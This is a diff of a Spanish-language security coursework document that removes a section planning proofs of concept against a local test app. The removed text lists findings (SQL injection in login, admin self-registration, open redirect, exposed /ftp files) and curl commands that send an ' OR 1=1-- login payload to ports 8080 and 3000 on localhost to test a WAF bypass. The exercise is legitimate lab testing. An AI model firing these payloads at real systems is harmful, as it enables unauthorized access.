@@ -316,42 +316,6 @@ Toda la superficie se evalúa sobre la instancia local del grupo, en `http://loc
 
 \* El control de rol en `/rest/admin/*` es justamente lo que se debe verificar: si responde sin sesión privilegiada, es el hallazgo.
 
-### Hallazgos del DAST que pasan a PoC del Hito 2
-
-De la Etapa 5, estos son los que el Equipo rojo convertirá en PoC reproducible (al menos 4, según el enunciado):
-
-| V-xx | Hallazgo | CWE | Endpoint | Amenaza |
-|---|---|---|---|---|
-| V-13 | SQLi en login | CWE-89 | `/rest/user/login` | T-01 |
-| V-14 | Registro como administrador | CWE-915 | `/api/Users` | T-10 |
-| V-01 | Redirección abierta | CWE-601 | `/redirect?to=` | T-03 |
-| V-11 | Archivos internos en `/ftp` | CWE-538 | `/ftp/*` | T-07 |
-
-Reserva (si se necesita una quinta): IDOR en `/rest/basket/:id` (T-11) y edición de reseña ajena (T-04 / V-12).
-
-### Bypass del WAF
-
-El WAF (P1, ModSecurity + CRS) filtra en `:8080`, pero la app también escucha en `:3000`. Si `:3000` responde a los mismos ataques sin bloquearlos, todo el filtrado del borde se evita apuntando al puerto directo.
-
-**Verificación (a ejecutar contra localhost, documentar comando, hora y salida):**
-
-```bash
-# ¿Responde el puerto directo?
-curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/rest/admin/application-version
-
-# Mismo payload de SQLi contra el WAF (8080) y contra la app directa (3000)
-curl -s -X POST http://localhost:8080/rest/user/login \
-  -H 'Content-Type: application/json' \
-  -d '{"email":"'"'"' OR 1=1--","password":"x"}' -o /dev/null -w "8080 -> %{http_code}\n"
-
-curl -s -X POST http://localhost:3000/rest/user/login \
-  -H 'Content-Type: application/json' \
-  -d '{"email":"'"'"' OR 1=1--","password":"x"}' -o /dev/null -w "3000 -> %{http_code}\n"
-```
-
-> **Resultado:** _(pegar aquí la salida real)_. Si `:3000` acepta el payload que `:8080` bloquea, se documenta como **bypass del WAF** y se recuerda que en H3 el WAF debe cubrir ese camino o cerrarse el puerto.
-
-*El mapa visual se guarda en esta carpeta como `superficie.png` (puede exportarse del site map de Burp o del spider de ZAP).*
 
 ---
 
